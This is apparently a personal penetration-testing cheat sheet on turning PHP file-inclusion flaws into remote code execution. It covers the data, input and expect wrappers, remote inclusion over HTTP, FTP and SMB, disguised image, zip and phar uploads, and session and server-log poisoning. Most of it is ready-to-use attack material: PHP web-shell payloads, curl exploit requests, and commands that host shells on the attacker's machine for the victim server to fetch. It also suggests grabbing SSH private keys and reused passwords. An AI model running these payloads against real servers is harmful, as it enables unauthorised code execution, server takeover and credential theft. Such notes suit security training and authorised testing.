---
layout: default
title: File Inclusion
permalink: /Web/RCE/
---

# Remote Code Execution
One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session.
- We may find the database password in a file like `config.php`, which may match a user's password in case they re-use the same password.
- We can check the `.ssh` directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key `id_rsa` and use it to SSH into the system.
- There are ways to achieve remote code execution directly through vulnerable functions.

## Wrappers
### Data Wrapper
However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations. 
<b>Checking:
We can include the PHP configuration file found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version.

```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
Then:
```
echo '<base64_encoded_string>' | base64 -d | grep allow_url_include
```
Remote Code Execution:
```
echo '<?php system($_GET["cmd"]); ?>' | base64
```
Then in the url bar:
```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<base64_encoded_command>
```
Or use curl:
```
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```
### Input Wrapper
- We pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work.
- The input wrapper also depends on the `allow_url_include` setting, as mentioned previously.
```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
*Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <\?php system('id')?>)*

### Expect Wrapper
Expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server.
<br>Checking is similar as previously:
```
echo '<base64_encoded_string>' | base64 -d | grep expect
```
We may find that a configuraion keyword is used to enable the except module. Then:
```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

## Remote File Inclusion (RFI)
This allows two main benefits:
- Enumerating local-only ports and web applications (i.e. SSRF).
- Gaining remote code execution by including a malicious script that we host.

Some of the functions that (if vulnerable) would allow RFI:
1. PHP
   - include()/include_once()
   - file_get_contents()
2. Java
   - import
3. .NET
   - @Html.RemotePartial()
   - include

### Verify RFI
- Any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled (see earlier).
- A more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (http://127.0.0.1:80/index.php) as our input string and see if it gets included:
  `http://<SERVER_IP>:<PORT>/index.php?<param>=http://127.0.0.1:80/index.php`<br>
  Furthermore, this could show us that the index.php page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.
  *Note: It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.*

### RCE with RFI
#### HTTP
The first step in gaining remote code execution is creating a malicious script in the language of the web application. We can use a custom web shell we download from the internet. <br>
Example:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server <LISTENING_PORT>
```
Then visit `http://<SERVER_IP>:<PORT>/index.php?<param>=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`.
*Note: We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload*

#### FTP
This may also be useful in case http ports are blocked by a firewall or the http:// string gets blocked by a WAF.
```
sudo python -m pyftpdlib -p 21
```
Then visit `http://<SERVER_IP>:<PORT>/index.php?<param>=ftp://<OUR_IP>/shell.php&cmd=id`.

#### SMB
If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

```
impacket-smbserver -smb2support share $(pwd)
```
Then visit `http://<SERVER_IP>:<PORT>/index.php?<param>=\\<OUR_IP>\share\shell.php&cmd=whoami`
<br>*Note: we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default*

#### LFI and File Uploads
##### Crafting Malicious Image
We can use an allowed image extension in our file name (e.g. shell.gif), and should also include the image magic bytes at the beginning of the file content (e.g. GIF8), just in case the upload form checks for both the extension and content type as well.
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution. To include the uploaded file, we need to know the path to our uploaded file. If you inspect the source code you may find out the location. If it doesn't help, we can try to fuzz for an uploads directory and then fuzz for our uploaded file.
After the upload visit the file:
```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```
##### ZIP Upload
Sometimes we can utilize the zip wrapper to execute PHP code.
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
After the upload visit:
```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
##### Phar Upload
First write the following PHP script into a shell.php file:
```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
Then we can compile it into a phar file and rename it to shell.jpg as follows:
```
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
After the upload visit:
```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
#### Log Poisoning
If we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the Execute privileges. This attack has the same concept: Writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code.

##### PHP Session Poisoning
Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.
The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. To do that go the Dev tools and look at the Storage tab.
After we find the PHPSESSID, we can visit:
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
Maybe we find a value which is under our control. Lets say that we can control the language parameter, then put a URL encoded PHP code into that value:
```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
Finally, we can include the session file:
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
*Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.*

##### Server Log Poisoning
Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.

By default, Apache logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while Nginx logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist to fuzz for their locations.

*Tip: Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.*

We can use BurpSuite or curl as follows:
```
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```
After that we can visit `index.php?language=/var/log/apache2/access.log&cmd=id`.

*Tip: The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.*

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them.







